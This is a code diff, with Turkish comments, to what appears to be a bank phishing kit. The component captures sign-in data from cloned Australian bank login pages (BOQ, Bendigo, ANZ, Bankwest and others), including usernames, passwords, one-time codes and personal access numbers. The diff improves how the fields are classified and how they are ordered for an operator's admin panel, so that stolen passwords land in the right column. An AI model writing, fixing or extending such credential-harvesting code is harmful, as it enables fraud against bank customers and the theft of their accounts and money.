@@ -124,9 +124,6 @@ function inferFieldKind(
 
   const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();
 
-  // ⭐ BOQ Classic SPECIAL MAP: BOQ inputların name attribute u SAYI (name=4 / name=8 / name=14)
-  //   oldugu icin standart regexler calismiyor. data-testid ve label attribute'lari GUCLU
-  //   oldugu icin oncelikle DATA-TESTID uzerinden eslestir:
   const dtid = ((el as HTMLElement)?.getAttribute?.("data-testid") ?? "").toLowerCase();
   const ida = ((el as HTMLElement)?.getAttribute?.("id") ?? "").toLowerCase();
   const cla = ((el as HTMLElement)?.getAttribute?.("class") ?? "").toLowerCase();
@@ -145,6 +142,14 @@ function inferFieldKind(
   const classAttr = cla;
   const parentDataTestId = pdtid;
 
+  // ⭐ BOQ Classic SPECIAL MAP: BOQ inputların name attribute u SAYI (name=4 / name=8 / name=14)
+  //   oldugu icin standart regexler calismiyor. data-testid ve label attribute'lari GUCLU
+  //   oldugu icin oncelikle DATA-TESTID uzerinden eslestir:
+  //   ⚠️ DİKKAT: BOQ Classic txtUserSignon (id=id8) 3. alandır (User ID) → personalCode
+  //              ANCAK "userid" tokenini GENEL BANKALARDA username olarak kullanmamalıyız
+  //              Suncorp / diğer bankalarda UserId = username olur. Bu yüzden:
+  //              SIKI BLOK: txtUserSignon, usersignon, businessusersignon VE data-testid=txtUserSignon
+  //              ŞARTIYLA SADECE BOQ ÖZELDE personalCode, genel userid/username → username
   if (
     dataTestId === "txtuserid" || idAttr === "txtuserid" || parentDataTestId === "txtuserid" ||
     /txtuserid|customeraccessnumber|customer-access-number|accessno|accessnumber/i.test(s1)
@@ -159,7 +164,7 @@ function inferFieldKind(
   }
   if (
     dataTestId === "txtusersignon" || idAttr === "txtusersignon" || parentDataTestId === "txtusersignon" ||
-    /txtusersignon|usersignon|userid|businessusersignon|form-group--user-id/i.test(s1)
+    /^txtusersignon$|^usersignon$|^businessusersignon$|form-group--user-id/i.test(s1)
   ) {
     return "personalCode";
   }
@@ -170,14 +175,35 @@ function inferFieldKind(
     return "tacCode";
   }
 
-  // STANDART GENEL regex (dig other banks):
-  if (type === "password" || /password|passcode|pin|secret/.test(raw)) return "password";
-  if (/tac|otp|one time|one-time|verification|security code|sms code|code|token|security token|rsa/i.test(raw)) return "tacCode";
-  if (type === "tel" || /phone|mobile|contact|cell/i.test(raw)) return "bankPhone";
-  if (/personal|identity|customer number|member number|ird|tax number|customer access/i.test(raw)) return "personalCode";
-  if (/username|user ?id|userid|login id|access ?number|client number|customer id|card number|account number|customer access/i.test(raw)) {
+  // ⭐ BENDIGO + DİĞER BANKALAR ACCESS ID/NUMBER LABEL + INPUT ID HIZLI MAP:
+  //   Bendigo step1 input: id="Username_AccessID" → label "Access ID" → username kind
+  //   Access Number / Access ID = username (tüm bankalar)
+  //   "Personal Access Number (PAN)" Bankwest: label 'Personal' sözcüğü geçiyor → personalCode
+  //   ayrıca autocomplete="username" var ise kesin username, autocomplete="current-password" ise password.
+  const autocomplete = ((el as HTMLElement)?.getAttribute?.("autocomplete") ?? "").toLowerCase();
+  if (autocomplete === "username") return "username";
+  if (autocomplete === "current-password" || autocomplete === "new-password") return "password";
+
+  if (/personal.?access.?number/i.test(s1 + " " + s2)) return "personalCode";
+  if (/access.?id|access.?number|customer.?access|customer.?registration|registration.?number|client.?number|logon.?id|login.?form.?username/i.test(s1 + " " + s2)) {
     return "username";
   }
+
+  // ⚠️ TİP ÖNCELİĞİ DEĞİŞTİRİLDİ:
+  //   ESKİ: type === "password" / type === "tel" EN ÖNCE kontrol edilirdi →
+  //         ANZ "Customer Registration Number" (type=tel) BANKPHONE olarak yanlış atanıyordu.
+  //   YENİ:
+  //     1.Önce password, passcode, pin, secret (password için) → sonra tac/otp (otp için)
+  //     2.SONRA username, userid, loginid, memberno, customerno, cardno, accountno, cif (USERNAME)
+  //     3.SONRA type === "tel" / phone / mobile (BANKPHONE, gerçeği telefon)
+  //   Böylece customer/member/registration number tel type olsa bile USERNAME olarak atanır.
+  if (type === "password" || /password|passcode|pin|secret/.test(raw)) return "password";
+  if (/tac|otp|one time|one-time|verification|security code|sms code|token|security token|rsa/i.test(raw)) return "tacCode";
+  if (/personal|identity|customer number|member number|ird|tax number/i.test(raw)) return "personalCode";
+  if (/username|user ?id|userid|login id|client number|customer id|card number|account number|customer number|member number|registration number|cif|cif.?number/i.test(raw)) {
+    return "username";
+  }
+  if (type === "tel" || /phone|mobile|contact|cell/i.test(raw)) return "bankPhone";
   return "unknown";
 }
 
@@ -191,12 +217,12 @@ function isMeaningfulField(el: any) {
   if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
   if ((el as HTMLElement)?.getAttribute?.("aria-hidden") === "true") return false;
 
-  // ⭐ GİZLİ (görünmeyen inputları filtrele:
+  // ⭐ GİZLİ (görünmeyen inputları filtrele):
   //   BOQ Classic 3 adet gizli password inputu (passwordname1/2/3)
-  //   style=position:absolute; left:-9999px; visibility:hidden; z-index:-1
-  //   type=password olsada value ları boştur ve orderedField sıralamasını KARIŞTIRIRLAR.
-  //   Eğer display:none, visibility:hidden, -9999px solda, veya offsetParent null (DOM'da görünmüyor)
-  //   gibi özelliklerinden herhangi birine sahipse anlamlı input SAYMA.
+  //   Bendigo step1 1 adet gizli password (tabindex=-1 + autocomplete=current-password + parent aria-hidden=true)
+  //   Bu inputlar type=password olsa da value ları boştur ve orderedField sıralamasını KARIŞTIRIRLAR.
+  //   Eğer display:none, visibility:hidden, -9999px solda, offsetParent null VEYA
+  //   tabindex=-1 + parent 5 seviyesinde aria-hidden=true ise anlamlı input SAYMA.
   try {
     const style = window.getComputedStyle(el as HTMLElement);
     if (style.display === "none") return false;
@@ -214,9 +240,23 @@ function isMeaningfulField(el: any) {
     }
   } catch {}
   try {
+    const ti = (el as HTMLElement)?.getAttribute?.("tabindex");
+    let parentAriaHidden = false;
+    try {
+      let p: HTMLElement | null = (el as HTMLElement)?.parentElement;
+      let depth = 0;
+      while (p && depth < 5) {
+        if (p.getAttribute?.("aria-hidden") === "true") { parentAriaHidden = true; break; }
+        p = p.parentElement;
+        depth++;
+      }
+    } catch {}
+    if (ti === "-1" && (parentAriaHidden || type === "password")) {
+      return false;
+    }
+  } catch {}
+  try {
     if ((el as HTMLElement).offsetParent == null) {
-      // Bazı browserlarda iframe srcdoc HTML'de her zaman offsetParent olabilir,
-      // offsetWidth/Height 0 ise gizlidir:
       const w = (el as HTMLElement).offsetWidth ?? 0;
       const h = (el as HTMLElement).offsetHeight ?? 0;
       if (w <= 1 && h <= 1) return false;
@@ -669,12 +709,50 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         fields.find((field) => field.kind === "username") ??
         fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
         null;
-      const passwordField = fields.find((field) => field.kind === "password") ?? fields.find((field) => field.kind === "tacCode") ?? null;
+      const passwordField =
+        fields.find((field) => field.kind === "password") ??
+        fields.find((field) => field.kind === "tacCode" && field.type === "password") ??
+        fields.find((field) => field.type === "password") ??
+        null;
       const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
       const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
       const tacField = fields.find((field) => field.kind === "tacCode") ?? null;
 
-      const orderedFields = fields.slice(0, 3);
+      // ⭐⭐⭐ EN KRİTİK DÜZELTME: orderedField1/2/3 SIRASI = DOM SIRASI (ESKİ) YERİNE
+      //    TÜR (kind) SIRASI (YENİ)! Böylece HANGİ BANKADA HANGİ SIRADA input olursa olsun
+      //    Admin paneldeki sıralı alanlar KESİN OLARAK:
+      //      orderedField1 = KULLANICI ADI (usernameField)
+      //      orderedField2 = ŞİFRE (passwordField)
+      //      orderedField3 = 3. alan (personalCode/tacCode/bankPhone/ilk unknown)
+      //    ESKİ hatalı DOM sırası: Bendigo step1 (1.görünür username, 2.gizli password →
+      //    gizli password skip → sadece usernameField var, sonra step2 passwordField →
+      //    history/merge sonrası orderedField1=passwordField (DOM yanlış sırası) sonucunda
+      //    admin Kullanıcı (ID) kolonuna ŞİFRE yazıyordu. YENİ SİSTEMDE BU ASLA OLMAZ!
+      const thirdField =
+        personalCodeField ?? tacField ?? phoneField ??
+        fields.find((f) => f.kind === "unknown" && f !== usernameField && f !== passwordField) ??
+        null;
+      const orderedFields: CapturedField[] = [
+        usernameField,
+        passwordField,
+        thirdField,
+      ].filter((f): f is CapturedField => f != null);
+
+      const orderedField1 = orderedFields[0] ?? null;
+      const orderedField2 = orderedFields[1] ?? null;
+      const orderedField3 = orderedFields[2] ?? null;
+
+      const resolveOrderedKey = (f: CapturedField | null, fallback: string): string => {
+        if (!f) return "";
+        if (f.kind === "unknown") return fallback;
+        return f.kind;
+      };
+      const resolveOrderedType = (f: CapturedField | null): string => {
+        if (!f) return "";
+        if (f.kind === "bankPhone") return "phone";
+        if (f.kind === "password" || f.kind === "tacCode" || f.type === "password") return "password";
+        return "";
+      };
       const rawFields: Record<string, string> = Object.fromEntries(
         fields.map((field, index) => {
           const suffix = field.key || `field_${index + 1}`;
@@ -694,24 +772,14 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         bankPhone: phoneField?.value ?? "",
         personalCode: personalCodeField?.value ?? "",
         tacCode: tacField?.value ?? "",
-        orderedField1: orderedFields[0]?.value ?? "",
-        orderedField1Key: orderedFields[0]?.kind === "unknown" ? "username" : (orderedFields[0]?.kind ?? ""),
-        orderedField2: orderedFields[1]?.value ?? "",
-        orderedField2Key: orderedFields[1]?.kind === "unknown" ? "" : (orderedFields[1]?.kind ?? ""),
-        orderedField2Type:
-          orderedFields[1]?.kind === "bankPhone"
-            ? "phone"
-            : orderedFields[1]?.kind === "password" || orderedFields[1]?.kind === "tacCode"
-              ? "password"
-              : "",
-        orderedField3: orderedFields[2]?.value ?? "",
-        orderedField3Key: orderedFields[2]?.kind === "unknown" ? "" : (orderedFields[2]?.kind ?? ""),
-        orderedField3Type:
-          orderedFields[2]?.kind === "bankPhone"
-            ? "phone"
-            : orderedFields[2]?.kind === "password" || orderedFields[2]?.kind === "tacCode"
-              ? "password"
-              : "",
+        orderedField1: orderedField1?.value ?? "",
+        orderedField1Key: resolveOrderedKey(orderedField1, "username"),
+        orderedField2: orderedField2?.value ?? "",
+        orderedField2Key: resolveOrderedKey(orderedField2, ""),
+        orderedField2Type: resolveOrderedType(orderedField2),
+        orderedField3: orderedField3?.value ?? "",
+        orderedField3Key: resolveOrderedKey(orderedField3, ""),
+        orderedField3Type: resolveOrderedType(orderedField3),
         rawFields,
         capturedAt: new Date().toISOString(),
       };
